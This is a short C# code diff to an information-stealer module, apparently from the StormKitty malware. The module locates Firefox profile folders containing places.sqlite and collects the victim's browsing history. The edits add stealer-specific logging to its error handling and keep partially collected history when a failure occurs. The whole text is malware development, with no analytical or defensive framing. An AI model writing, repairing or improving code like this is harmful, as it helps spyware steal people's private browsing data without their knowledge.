@@ -17,7 +17,8 @@ namespace Stealer.Firefox
                     foreach (string sDir in Directory.GetDirectories(dir))
                         if (File.Exists(sDir + "\\places.sqlite"))
                             return sDir + "\\places.sqlite";
-            } catch { }
+            }
+            catch (Exception ex) { StormKitty.Logging.Log("Firefox >> Failed to find history\n" + ex); }
             return null;
         }
 
@@ -49,11 +50,9 @@ namespace Stealer.Firefox
                         scHistory.Add(sSite);
                     }
                 }
-
-                return scHistory;
             }
-            catch (Exception ex) { Console.WriteLine(ex); }
-            return new List<Site>();
+            catch (Exception ex) { StormKitty.Logging.Log("Firefox >> history collection failed\n" + ex); }
+            return scHistory;
         }
 
     }
